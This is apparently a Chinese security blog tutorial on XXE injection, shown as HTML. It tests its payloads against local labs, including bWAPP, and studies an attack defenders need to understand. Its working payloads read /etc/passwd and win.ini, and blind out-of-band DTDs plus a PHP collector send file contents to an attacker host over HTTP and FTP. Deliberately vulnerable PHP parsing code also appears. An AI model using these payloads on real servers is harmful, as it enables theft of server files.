@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>漏洞学习之XXE注入 | sh1yan&#39;blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="description" content="123456789101112131415 &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;       // XML声明 &amp;lt;!DOCTYPE note [                             //定义类型 	&amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt;   //定义元素 	&amp;lt;!EL">
+<meta name="keywords" content="web漏洞,XXE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞学习之XXE注入">
+<meta property="og:url" content="sh1yan.top/2018/09/15/xxe-study/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="123456789101112131415 &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;       // XML声明 &amp;lt;!DOCTYPE note [                             //定义类型 	&amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt;   //定义元素 	&amp;lt;!EL">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-05-07T13:19:13.860Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="漏洞学习之XXE注入">
+<meta name="twitter:description" content="123456789101112131415 &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;       // XML声明 &amp;lt;!DOCTYPE note [                             //定义类型 	&amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt;   //定义元素 	&amp;lt;!EL">
+  
+    <link rel="alternative" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/gossip">Gossip</a>
+        
+          <a class="main-nav-link" href="/yqlj">Links</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="sh1yan.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-xxe-study" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/15/xxe-study/" class="article-date">
+  <time datetime="2018-09-15T09:40:55.000Z" itemprop="datePublished">2018-09-15</time>
+</a>
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/漏洞研究/">漏洞研究</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      漏洞学习之XXE注入
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="sh1yan.top/2018/09/15/xxe-study/"></div>
+    </li>
+  </ul>
+</div>
+
+      
+      
+        
+        <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>       // XML声明</span><br><span class="line"> <span class="meta">&lt;!DOCTYPE note [                             //定义类型</span></span><br><span class="line"><span class="meta"> 	&lt;!ELEMENT note (to,from,heading,body)&gt;   //定义元素</span></span><br><span class="line"><span class="meta"> 	&lt;!ELEMENT to (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta"> 	&lt;!ELEMENT from (#PCDATA)&gt;                // 文档类型定义</span></span><br><span class="line"><span class="meta"> 	&lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta"> 	&lt;!ELEMENT body (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>lixin<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>shiyan<span class="tag">&lt;/<span class="name">from</span>&gt;</span>                // 文档元素</span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Hurry up and send out XXE's article<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br>DTD 主要用来解释文档元素的，它有三种应用形式：</p>
+<a id="more"></a>
+<p>1.内部DTD文档</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>2.外部DTD文档</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</span></span><br></pre></td></tr></table></figure>
+<p>3内外部DTD文档结合</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "DTD文件路劲"[定义内容]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>DTD文档中有很多重要的关键词：</p>
+<p>DOCTYPE（DTD的声明）<br>ENTITY（实体的声明）<br>SYSTEM、PUBLIC（外部资源申请）</p>
+<p>而实体可以理解为变量，它必须在DTD中定义申明，然后再文档中的其他位置引用该变量，实体也是分三种<br>形式，分别是：</p>
+<p>1.内部实体<br>    &lt;!ENTITY 实体名称 “实体的值”&gt;<br>2.外部实体<br>    &lt;!ENTITY 实体名称 SYSTEM “URI”&gt;<br>3.参数实体<br>    &lt;!ENTITY % 实体名称 “实体的值”&gt;<br>OR<br>    &lt;!ENTITY % 实体名称 SYSTEM “URI”&gt;</p>
+<p>XXE主要分为回显和不回显两个类型。<br>一般在测试 XXE 的时候，通过 POST 一个 XML 请求，看是出现了报错还是正常的实体解析，<br>比如 POST 一个 <root>shiyan</root> 如果返回页面只出现了 shiyan 则说明正常的实体解析了。<br>当然也可以 POST 一个这样的完整的 XML代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY test  <span class="string">"shiyan"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;test;&lt;/note&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<p>下面是一个测试代码，可以复制到搭建的环境中， 然后本地 POST 尝试下。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;</span><br><span class="line">	&lt;textarea name=&quot;keyword&quot; value=&quot;&quot; style=&quot;width: 500px; height: 300px&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">keyword = _POST[&apos;keyword&apos;];</span><br><span class="line">xml_obj = simplexml_load_string(keyword);</span><br><span class="line">print_r($xml_obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>如果发现支持实体解析，那么就开始尝试是否能引入外部实体了。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY shiyan SYSTEM "file://localhost/c:/windows/win.ini"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;shiyan;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>OR</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这两个都一样，只不过是上面的那个是查找 windows/win 下的，下面的那个是 linux 下的代码。<br>对了，有些情况下，会直接看到 POST 中存在一些 XML 文档元素，我们可以手动的在这些文档元素中，<br>随便输入一些数字或者字母，看看回显的内容中有没有存在可控的参数，如果存在，可以尝试引入外部实体来<br>控制这个可控的参数进行注入。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/bWAPP/xxe-2.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-type</span>: text/xml; charset=UTF-8</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1/bWAPP/xxe-1.php</span><br><span class="line"><span class="attribute">Content-Length</span>: 59</span><br><span class="line"><span class="attribute">Cookie</span>: bdshare_firstime=1504239219561; PHPSESSID=qke00v8tqre5b4tdfcjchmb155; security_level=0</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 0.0.0.0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&lt;reset&gt;&lt;login&gt;bee&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure>
+<p>在这个数据包中，我们发现 bee 这个参数是可控的，我们可以构造如下数据包，进行尝试是否可以注入读取文件。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/bWAPP/xxe-2.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-type</span>: text/xml; charset=UTF-8</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1/bWAPP/xxe-1.php</span><br><span class="line"><span class="attribute">Content-Length</span>: 193</span><br><span class="line"><span class="attribute">Cookie</span>: bdshare_firstime=1504239219561; PHPSESSID=qke00v8tqre5b4tdfcjchmb155; security_level=0</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 0.0.0.0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY test SYSTEM "file://localhost/c:/windows/win.ini"&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;</span><br><span class="line">  &lt;login&gt;&amp;test;&lt;/login&gt; </span><br><span class="line">  &lt;secret&gt;shiyan&lt;/secret&gt;</span><br><span class="line">&lt;/reset&gt;</span><br><span class="line">&lt;/pre</span><br></pre></td></tr></table></figure>
+<p>查看响应包。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 05 Oct 2017 14:29:52 GMT</span><br><span class="line">Server: Apache/2.4.10 (Win32) OpenSSL/1.0.1h PHP/5.4.31</span><br><span class="line">X-Powered-By: PHP/5.4.31</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Length: 96</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">; for 16-bit app support</span><br><span class="line">[fonts]</span><br><span class="line">[extensions]</span><br><span class="line">[mci extensions]</span><br><span class="line">[files]</span><br><span class="line">&apos;s secret has been reset!</span><br></pre></td></tr></table></figure>
+<p>成功回显了我们读取的内容。<br>这个是在有回显的情况下这样操作的，当页面是无回显的，就是报错页面出现xml解析器，或者出现一些空白页面<br>和报错出现绝对路径等等一些情况，我们无法判断是否支持外部引入实体，那么可以这样操作。</p>
+<p>向存在可控参数的地方注入一条向自己服务器发送请求的xml代码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY test SYSTEM "http://localhost/2.txt"&gt;    //localhost 为自己服务器的URL地址</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后我们查看自己服务器日志，可以看出来是否存在外部引入实体。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">::1 - - [06/Oct/2017:11:19:25 +0800] &quot;GET /2.txt HTTP/1.0&quot; 200 49 &quot;-&quot; &quot;-&quot;</span><br><span class="line">127.0.0.1 - - [06/Oct/2017:11:19:25 +0800] &quot;POST /XXE/test.php HTTP/1.1&quot; 200 325 &quot;http://127.0.0.1/XXE/test.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span><br></pre></td></tr></table></figure>
+<p>可以看出来，存在外部引入，当然我们也可以用参数实体来测试。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % shiyan SYSTEM "http://localhost/2.txt"&gt;</span></span><br><span class="line"><span class="meta">%shiyan;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后我们继续查看日志，看看参数实体可行不。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">::1 - - [06/Oct/2017:11:31:18 +0800] "GET /2.txt HTTP/1.0" 200 49 "-" "-"</span><br><span class="line">127.0.0.1 - - [06/Oct/2017:11:31:18 +0800] "POST /XXE/test.php HTTP/1.1" 200 1527 "http://127.0.0.1/XXE/test.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"</span><br></pre></td></tr></table></figure>
+<p>同样的，都成功了，那么就存在外部实体引入，那就很可能存在XXE注入，因为他是无回显的，所以我<br>们只能用 blind xxe 来达到攻击效果。</p>
+<p>blind xxe 的原理很简单，就是建立一条带外信道提取数据，利用外部实体中的 URL 发出访问，从而跟攻击者的公网主机<br>，也就是一台攻击者的服务器，从而达到数据的读取。</p>
+<p>我们还是利用上面的那个那个代码来当环境，来本地搭建解释下这个原理。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;</span><br><span class="line">	&lt;textarea name=&quot;keyword&quot; value=&quot;&quot; style=&quot;width: 500px; height: 300px&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$keyword = $_POST[&apos;keyword&apos;];</span><br><span class="line">$xml_obj = simplexml_load_string($keyword);</span><br><span class="line">echo &quot;---shiyan----&quot; ;</span><br><span class="line">print_r($xml_obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后，我们开始构造 payload 1 的 XML 代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "file:///G:/1.txt"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://192.168.1.106/XXE/ceshi/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中，第三行把 file 找到的内容赋值给参数 %file ，然后第四行为外部引入攻击者自己服务器的 DTD 文档<br>然后第五行执行下这个参数 %remote; ，第六行的 %send; 为攻击者自己服务器的 DTD文档 里的参数实体。</p>
+<p><a href="http://192.168.1.106/XXE/ceshi/evil.dtd" target="_blank" rel="noopener">http://192.168.1.106/XXE/ceshi/evil.dtd</a> 的内容：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">all</span> </span></span><br><span class="line">"&lt;!ENTITY &amp;#x25; send SYSTEM </span><br><span class="line">'http://192.168.1.106/XXE/ceshi/1.php?file=%file;'&gt;"&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+<p>这里是参数实体 %all 的值为后面 “” 这个字符串里的内容，而这个字符串里的内容为把一开始发送的<br>payload 1 里的 file协议 找到的内容作为参数发送到攻击者着的服务器里的另一个 1.php 文件里，<br>而这个字符串赋值给了参数 %send; ，在这里先运行了下 %all; 所以在一开始的那个 payload 1 里<br>只运行了 %send; 这个值是上面解释的那些内容，那我们再看下这个 1.php 里到底是什么内容吧。</p>
+<p>1.php 内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">"1.txt"</span>, $_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>就是把接受到的参数写到 1.TXT 这个文档里，可能看到这里，会有点乱的感觉，我在整理下思路。<br>整个过程都是本地的，只是模拟下原理，攻击者（公网） 向存在 XXE 漏洞的服务器发送了一条payload<br>，这个 payload 的功能是查找服务器本机某个文件，然后向攻击者着的服务器请求一条URL请求，获取这个<br>恶意的 dtd 内容，当存在漏洞的服务器读取到这个 dtd 的内容为把一开始自己找的本地的那个文件<br>内容做为参数去传递给攻击者服务器的这个 1.php 文件，这个1.php 的文件是把获取的这个参数本地保存<br>下来，从而，就这样的得到了回显的内容。</p>
+<p>在那个 dtd 文档里，用编码 &#x25; 代替了 % 是因为嵌套引用外部参数实体，如果直接利用%，在引用的时候会导致找不到该参数实体名称<br>，我们先演示一下上面的样例。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.106 - - [06/Oct/2017:17:04:20 +0800] "GET /XXE/ceshi/evil.dtd HTTP/1.0" 200 108 "-" "-"</span><br><span class="line">192.168.1.106 - - [06/Oct/2017:17:04:20 +0800] "GET /XXE/ceshi/1.php?file=shiyan521,nishizuiyouxiudebaimaozi! HTTP/1.0" 200 - "-" "-"</span><br><span class="line">127.0.0.1 - - [06/Oct/2017:17:04:20 +0800] "POST /XXE/ceshi/test1.php HTTP/1.1" 200 603 "http://127.0.0.1/XXE/ceshi/test1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"</span><br></pre></td></tr></table></figure>
+<p>我们查看日志，可以发现这个攻击成功了，但是有一点，就是这样的读取文件的时候，如果文件里存在空格<br>和尖括号的时候，这这种读取方式就会报错，然后攻击失败，由于本机环境是用的PHP的环境，所以可以<br>使用 php://filter读取base64编码 这个方式来读取，就不会出错了，那我们改下 payload 1 来测试下。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://192.168.1.106/XXE/ceshi/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们查看下那个 1.txt 文件，</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbZm9udHNdDQpbZXh0ZW5zaW9uc10NClttY2kgZXh0ZW5zaW9uc10NCltmaWxlc10NCg==</span><br></pre></td></tr></table></figure>
+<p>是 base64 编码的，我们解码一下。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; for 16-bit app support</span><br><span class="line">[fonts]</span><br><span class="line">[extensions]</span><br><span class="line">[mci extensions]</span><br><span class="line">[files]</span><br></pre></td></tr></table></figure>
+<p>成功的读取到了文件内容，这就是简单的原理，一般我们都是用的 vps ，然后利用 ftp 协议来<br>读取的，那我们再演示一下真正的攻击过程。</p>
+<p>这个思路和上面的原理一样，准备一台客户端，可以内网，当然公网主机最好了，然后存在漏洞的web服务器，<br>和 VPS ，如果直接公网主机的话，那就省了。</p>
+<ol>
+<li>客户端发送 payload 1 给存在漏洞的 web 服务器</li>
+<li>web 服务器向 VPS 获取到恶意的 DTD ，并执行读取到的这个恶意的 DTD 内容</li>
+<li>web 服务器把读取本机的那个文件的内容去访问特定 FTP 或者 HTTP </li>
+<li>攻击者通过 VPS 监听这个特定的端口得到回显的内容</li>
+</ol>
+<p>payload 1 ：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://攻击者公网主机地址/test.xml"&gt;%remote;]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>和上面的思路一样，把 payload 1 发送给存在漏洞的 Web 服务器，然后存在漏洞的 web 服务器<br>会去访问这个 xml 的内容。</p>
+<p>test.xml ：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % aaa "&lt;!ENTITY &amp;#37; bbb SYSTEM 'ftp://攻击者（公网）:xx/%file;'&gt;"&gt;</span><br><span class="line">%aaa;</span><br><span class="line">%bbb;</span><br></pre></td></tr></table></figure>
+<p>端口可以随便设置一些空闲的端口，看到这里，是不是和上面的思路差不多，都是通过<br>URL来带入参数的。</p>
+<p>这里说一下，结合着上面的内容，我们都需要把 &lt; &gt; “ ‘ 都HTML实体编码一下，payload 1 的编码就行了，第二个只需要<br>编码那一个符号就行，我已经编码了。</p>
+<p>&lt;  &lt;  小于<br>&gt;  &gt;  大于<br>&apos;  ‘  单引号<br>&quot;  “  双引号</p>
+<p>由于我本人没有公网的 VPS 所以，这个就不实体再编码一下了，毕竟，我没实战漏洞环境和<br> VPS 啊啊啊啊！！！</p>
